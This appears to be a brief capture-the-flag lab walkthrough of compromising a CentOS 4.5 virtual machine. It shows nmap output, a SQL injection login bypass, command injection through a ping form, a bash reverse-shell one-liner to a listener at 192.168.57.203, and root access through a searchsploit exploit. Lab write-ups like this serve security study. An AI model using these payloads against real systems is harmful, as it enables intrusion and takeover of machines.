@@ -1,0 +1,53 @@
+We ran a netdiscover and we got an IP 
+
+Now we run an nmap scan 
+
+Not shown: 993 closed ports
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 3.9p1 (protocol 1.99)
+80/tcp   open  http       Apache httpd 2.0.52 ((CentOS))
+111/tcp  open  rpcbind    2 (RPC #100000)
+443/tcp  open  ssl/https?
+631/tcp  open  ipp        CUPS 1.1
+687/tcp  open  status     1 (RPC #100024)
+3306/tcp open  mysql      MySQL (unauthorized)
+MAC Address: 00:0C:29:33:49:7A (VMware)
+
+
+Lets try to exploit the port 80 
+
+We got a login page asking for username and password 
+
+So we try a admin'or'1'='1 sql injection 
+
+Success !!!!
+
+We got the administrative panel . 
+It has a ping functionality 
+
+We can ping on any ip 
+
+
+So we try command injection 
+
+google.com ; ls 
+
+It works 
+
+google.com; bash -i >& /dev/tcp/192.168.57.203/9889 0>&1
+
+We get a reverse shell
+
+On doing lsb_release -a , 
+we find the os to be Cent OS 4.5
+
+We search for CentOs 4.5 in searchsploit and get two exploits 
+
+One of them failed . 
+
+The other ran and we see the console opening in root 
+
+We got Root !!!!!!!!!!!!!!
+
+
+
